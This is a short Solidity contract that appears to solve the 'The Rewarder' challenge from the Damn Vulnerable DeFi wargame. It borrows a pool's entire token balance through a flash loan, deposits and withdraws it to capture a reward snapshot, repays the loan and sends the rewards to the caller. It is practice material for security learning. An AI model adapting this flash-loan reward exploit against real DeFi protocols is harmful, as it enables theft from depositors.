// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import './FlashLoanerPool.sol';
import './TheRewarderPool.sol';
import '../DamnValuableToken.sol';

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TheRewarderPoolHack {
  FlashLoanerPool public flashLoanPool;
  TheRewarderPool public rewardedPool;
  DamnValuableToken public token;
  RewardToken public reward;



  constructor(FlashLoanerPool _flashLoanPool, TheRewarderPool _rewardedPool, DamnValuableToken _token, RewardToken _reward) {
    flashLoanPool = _flashLoanPool;
    rewardedPool = _rewardedPool;
    token = _token;
    reward = _reward;
  }

  function hack() external {
    uint amount = token.balanceOf(address(flashLoanPool));
    flashLoanPool.flashLoan(amount);
    uint earned = reward.balanceOf(address(this));
    reward.transfer(msg.sender, earned);
  }

  function receiveFlashLoan(uint256 amount) external {
    token.approve(address(rewardedPool), amount);
    rewardedPool.deposit(amount);
    rewardedPool.withdraw(amount);
    token.transfer(address(flashLoanPool), amount);
  }

  receive() external payable {}
}
